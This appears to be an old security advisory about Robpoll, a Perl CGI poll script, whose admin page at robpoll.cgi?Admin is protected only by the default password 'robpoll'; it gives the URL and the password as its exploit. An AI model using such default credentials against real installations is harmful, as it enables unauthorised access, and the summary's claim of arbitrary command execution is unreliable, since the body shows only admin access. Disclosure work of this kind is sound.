Summary:

	Anyone can execute any command on the remote system with
	the priveleges of the web server. Anyone can read any file
	on the remote system which the account in wich the webserver
	runs as.


Vulnerability:

Robpoll is a free cgi based admin program.
I played with the CGI and discovered that the function admin
is set by a default password called "robpoll":

1: Add New Question
2: Remove Question
3: Change Password	<--here is the bug


There is an admin function for adding and removing questions, which
is run through the robpoll.cgi, as shown in poll.html.

The admin section of the script is password protected.  The default
password is "robpoll".  You can change it through one of the admin
functions.


These are the files you should have:

  1.  robpoll.cgi  . . . . . . the main Perl script
  2.  pollssi.cgi  . . . . . . the Perl script for SSI
  3.  poll.html  . . . . . . . sample html file
  4.  data.txt . . . . . . . . main data file
  5.  q1.txt . . . . . . . . . question data
  6.  ip1.txt  . . . . . . . . ip data
  7.  num.txt  . . . . . . . . data
  8.  white.jpg  . . . . . . . image for graphing
  9.  robpoll.jpg  . . . . . . link image
  10. readme.txt . . . . . . . this file


Exploit:

(1) robpoll.cgi -

	http://www.example.com/cgi-bin/robpoll.cgi?Admin

(2) You will receive an message html like:

	1: Add New Question
	2: Remove Question
	3: Change Password

(3) The password by default is "robpoll", leaving this password thus
compromises the system and its files.
